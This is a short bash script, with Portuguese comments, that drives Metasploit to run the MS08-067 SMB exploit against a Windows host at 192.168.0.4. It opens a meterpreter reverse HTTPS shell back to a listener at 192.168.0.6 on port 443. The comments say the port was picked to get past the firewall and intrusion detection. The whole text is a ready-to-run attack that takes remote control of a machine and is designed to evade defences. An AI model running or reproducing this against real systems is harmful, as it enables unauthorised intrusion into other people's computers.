#!/bin/bash

#burlar portas, no firewall e ids caso 443
#grep -i reverse_https search payload

msfconsole -x "use exploit/windows/smb/ms08_067_netapi;
set RHOST 192.168.0.4;
set PAYLOAD windows/meterpreter/reverse_https;
set LHOST 192.168.0.6;
set LPORT 443;
run"
